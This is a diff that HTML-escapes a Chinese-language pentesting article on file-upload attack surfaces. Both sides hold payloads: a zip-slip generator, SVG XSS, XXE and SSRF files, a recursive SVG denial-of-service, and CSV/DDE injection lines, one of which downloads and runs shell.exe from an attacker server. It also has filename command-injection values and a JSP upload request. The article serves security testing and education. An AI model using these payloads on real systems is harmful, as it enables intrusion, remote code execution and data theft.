@@ -1,8 +1,8 @@
-# 文件上传攻击面&案例
+# 文件上传攻击面&amp;案例
 
 
 
-<!--more-->
+&lt;!--more--&gt;
 ## 1.1. 前言
 
 本文主要介绍文件上传功能点有哪些攻击面。
@@ -74,16 +74,16 @@ tar		jar		war		cpio		apk		rar		7z
 
 **构造代码：**
 
-> 也可以用别人写好的工具：https://github.com/ptoomey3/evilarc
+&gt; 也可以用别人写好的工具：https://github.com/ptoomey3/evilarc
 
 ```python
 import zipfile
 # the name of the zip file to generate
-zf = zipfile.ZipFile('out.zip', 'w')
+zf = zipfile.ZipFile(&#39;out.zip&#39;, &#39;w&#39;)
 # the name of the malicious file that will overwrite the origial file (must exist on disk)
-fname = 'zip_slip.txt'
+fname = &#39;zip_slip.txt&#39;
 #destination path of the file
-zf.write(fname, '../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa')
+zf.write(fname, &#39;../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa&#39;)
 ```
 
 
@@ -187,14 +187,14 @@ html造成XSS就不多说了，懂得都懂
 1. 创建一个恶意的svg文件，输入如下内容：
 
 ```xml
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
-   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-   <script type="text/javascript">
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;
+&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;
+&lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
+   &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt;
+   &lt;script type=&#34;text/javascript&#34;&gt;
       alert(document.domain);
-   </script>
-</svg>
+   &lt;/script&gt;
+&lt;/svg&gt;
 ```
 
 上传到文件中，并访问即可触发XSS。
@@ -206,11 +206,11 @@ XXE in XML
 以恶意svg为例，一般尝试OOB外带注入的方式来判断最快
 
 ```xml
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-  <text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/hostname&#34; &gt; ]&gt;
+&lt;svg width=&#34;128px&#34; height=&#34;128px&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; version=&#34;1.1&#34;&gt;
+  &lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
 ```
 
 恶意的XXE文档生成：[docem](https://github.com/whitel1st/docem.git)
@@ -235,10 +235,10 @@ XXE in OOXML/ODF
 如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在**SSRF**
 
 ```xml
-<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"> 
-<image height="30" width="30" 
-xlink:href="https://controlledserver.com/pic.svg" /> 
-</svg>
+&lt;svg xmlns:svg=&#34;http://www.w3.org/2000/svg&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; width=&#34;200&#34; height=&#34;200&#34;&gt; 
+&lt;image height=&#34;30&#34; width=&#34;30&#34; 
+xlink:href=&#34;https://controlledserver.com/pic.svg&#34; /&gt; 
+&lt;/svg&gt;
 ```
 
 可尝试使用其他协议更直观的查看，如`file://`
@@ -254,28 +254,28 @@ xlink:href="https://controlledserver.com/pic.svg" />
 
 如果可以上传任意SVG文件，且可在网站的某些页面中进行展示，那么可以通过反复嵌套使用，直至浏览器或者电脑卡死。
 
-> 可以展示：不一定非得是`<svg>`标签的形式，也可以通过img等标签展示，形如：`<img src="data:image/svg+xml;base64,<svg base64>" alt="SVG Image">`
+&gt; 可以展示：不一定非得是`&lt;svg&gt;`标签的形式，也可以通过img等标签展示，形如：`&lt;img src=&#34;data:image/svg&#43;xml;base64,&lt;svg base64&gt;&#34; alt=&#34;SVG Image&#34;&gt;`
 
 ```xml
-<svg version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" xml:space="preserve">
-<path id="a" d="M0,0"/>
-<g id="b"><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/><use xlink:href="#a"/></g>
-<g id="c"><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/><use xlink:href="#b"/></g>
-<g id="d"><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/><use xlink:href="#c"/></g>
-<g id="e"><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/><use xlink:href="#d"/></g>
-<g id="f"><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/><use xlink:href="#e"/></g>
-<g id="g"><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/><use xlink:href="#f"/></g>
-<g id="h"><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/><use xlink:href="#g"/></g>
-<g id="i"><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/><use xlink:href="#h"/></g>
-<g id="j"><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/><use xlink:href="#i"/></g>
-</svg>
+&lt;svg version=&#34;1.2&#34; baseProfile=&#34;tiny&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; x=&#34;0px&#34; y=&#34;0px&#34; xml:space=&#34;preserve&#34;&gt;
+&lt;path id=&#34;a&#34; d=&#34;M0,0&#34;/&gt;
+&lt;g id=&#34;b&#34;&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;use xlink:href=&#34;#a&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;c&#34;&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;use xlink:href=&#34;#b&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;d&#34;&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;use xlink:href=&#34;#c&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;e&#34;&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;use xlink:href=&#34;#d&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;f&#34;&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;use xlink:href=&#34;#e&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;g&#34;&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;use xlink:href=&#34;#f&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;h&#34;&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;use xlink:href=&#34;#g&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;i&#34;&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;use xlink:href=&#34;#h&#34;/&gt;&lt;/g&gt;
+&lt;g id=&#34;j&#34;&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;use xlink:href=&#34;#i&#34;/&gt;&lt;/g&gt;
+&lt;/svg&gt;
 ```
 
 **原理**：
 
 `xlink:href` 属性以 IRI（国际资源标识）方式定义了对某个资源的引用，该链接的具体含义需根据使用该链接的每个元素的上下文来决定。
 
-`<use>` 元素从 SVG 文档中获取节点，然后将其复制到其他位置。
+`&lt;use&gt;` 元素从 SVG 文档中获取节点，然后将其复制到其他位置。
 
 上述代码通过递归嵌套，导致浏览器拒绝服务，网站页面崩溃。
 
@@ -288,12 +288,12 @@ xlink:href="https://controlledserver.com/pic.svg" />
 CSV Payload
 
 ```csv
-DDE ("cmd";"/C calc";"!A0")A0
-@SUM(1+9)*cmd|' /C calc'!A0
-=10+20+cmd|' /C calc'!A0
-=cmd|' /C notepad'!'A1'
-=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
-=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
+DDE (&#34;cmd&#34;;&#34;/C calc&#34;;&#34;!A0&#34;)A0
+@SUM(1&#43;9)*cmd|&#39; /C calc&#39;!A0
+=10&#43;20&#43;cmd|&#39; /C calc&#39;!A0
+=cmd|&#39; /C notepad&#39;!&#39;A1&#39;
+=cmd|&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;!A0
+=cmd|&#39;/c rundll32.exe \\10.0.0.1\3\2\1.dll,0&#39;!_xlbgnm.A1
 ```
 
 **检查思路：**
@@ -394,7 +394,7 @@ $ exiftool -field = XSS FILE
 
 ```sh
 #!bash
-$ exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ brute.jpeg
+$ exiftool -Artist=’ “&gt;&lt;img src=1 onerror=alert(document.domain)&gt;’ brute.jpeg
 ```
 
 参考：
@@ -430,7 +430,7 @@ ImageMagick相关的CVE
 
 参考：
 
-- [Missing "size check" on files to upload could make memory leaks.](https://hackerone.com/reports/19532)
+- [Missing &#34;size check&#34; on files to upload could make memory leaks.](https://hackerone.com/reports/19532)
 - [AWS keys and user cookie leakage via uninitialized memory leak in outdated librsvg version in Basecamp](https://hackerone.com/reports/2107680)
 
 ### GhostScript PS/PDF
@@ -457,7 +457,7 @@ ImageMagick相关的CVE
 
 常见的文件预览包括：PDF、图片、HTML等文件。
 
-如果应用程序调整图片大小或处理媒体，请检查图像漏洞 (+favicon.ico)
+如果应用程序调整图片大小或处理媒体，请检查图像漏洞 (&#43;favicon.ico)
 
 这个比较简单，和上面内容有重复，就不说了。
 
@@ -490,9 +490,9 @@ web.config
 
 
 
-> :bell: Tip
->
-> 在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常
+&gt; :bell: Tip
+&gt;
+&gt; 在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常
 
 较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。
 
@@ -520,10 +520,10 @@ Your identification has been saved in fileup
 Your public key has been saved in fileup.pub  
 ...  
 
-kali@kali:~$ cat fileup.pub > authorized_keys
+kali@kali:~$ cat fileup.pub &gt; authorized_keys
 ```
 
-> 为文件上传准备authorized_keys 文件
+&gt; 为文件上传准备authorized_keys 文件
 
 使用相对路径 `../../../../../../../root/.ssh/authorized_keys` 上传它进行覆盖。
 
@@ -531,7 +531,7 @@ kali@kali:~$ cat fileup.pub > authorized_keys
 
 尝试将 URL 作为文件名发送以获取盲 SSRF，例如`filename=https://172.17.0.1/internal/file`。
 
-还可以尝试在请求中更改`type="file"`为。`type="url"`
+还可以尝试在请求中更改`type=&#34;file&#34;`为。`type=&#34;url&#34;`
 
 ### DOS
 
@@ -550,9 +550,9 @@ kali@kali:~$ cat fileup.pub > authorized_keys
 ```sh
 a$(whoami)z.png
 a`whoami`z.png
-a';select+sleep(10);--z.png
+a&#39;;select&#43;sleep(10);--z.png
 sleep(10)-- -.png
-<h1>test<h1>.png
+&lt;h1&gt;test&lt;h1&gt;.png
 ${2*3}
 ```
 
@@ -578,13 +578,13 @@ POST /uai/download/uploadfileToPath.htm HTTP/1.1
 …………
 
 -----------------------------570xxxxxxxxx6025274xxxxxxxx1
-Content-Disposition: form-data; name="input_localfile"; filename="xxx.jsp"
+Content-Disposition: form-data; name=&#34;input_localfile&#34;; filename=&#34;xxx.jsp&#34;
 Content-Type: image/png
 
-<%out.println('test123');%>
+&lt;%out.println(&#39;test123&#39;);%&gt;
 
 -----------------------------570xxxxxxxxx6025274xxxxxxxx1
-Content-Disposition: form-data; name="uploadpath"
+Content-Disposition: form-data; name=&#34;uploadpath&#34;
 
 ../webapps/notifymsg/devreport/
 -----------------------------570xxxxxxxxx6025274xxxxxxxx1--
@@ -600,9 +600,9 @@ Content-Disposition: form-data; name="uploadpath"
 
 如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。
 
->  Note
->
-> 元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF
+&gt;  Note
+&gt;
+&gt; 元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF
 
 **检查方法：**
 
